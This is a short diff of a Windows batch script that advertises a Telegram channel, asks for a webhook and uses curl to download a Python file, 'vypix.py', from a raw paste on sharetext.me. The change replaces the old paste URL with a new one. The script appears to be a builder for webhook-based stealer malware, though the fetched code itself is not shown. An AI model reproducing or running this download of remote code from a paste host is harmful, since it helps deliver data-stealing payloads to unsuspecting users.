@@ -103,7 +103,7 @@ echo.
 echo                                             Telegram : https://t.me/syntheticcs
 echo.
 set /p webhook="Whats your Webhook > "
-set url=https://sharetext.me/raw/wfbd6oxszq
+set url=https://sharetext.me/raw/hyqfdykyus
 set file=vypix.py
 
 curl %url% > %file%
